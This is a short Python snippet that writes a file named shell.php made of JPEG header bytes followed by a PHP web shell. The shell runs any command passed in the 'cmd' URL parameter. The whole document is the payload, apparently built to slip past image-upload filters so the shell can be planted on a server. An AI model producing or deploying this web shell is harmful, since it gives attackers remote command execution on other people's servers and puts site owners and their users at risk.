with open("shell.php", "wb") as shell:
	shell.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')
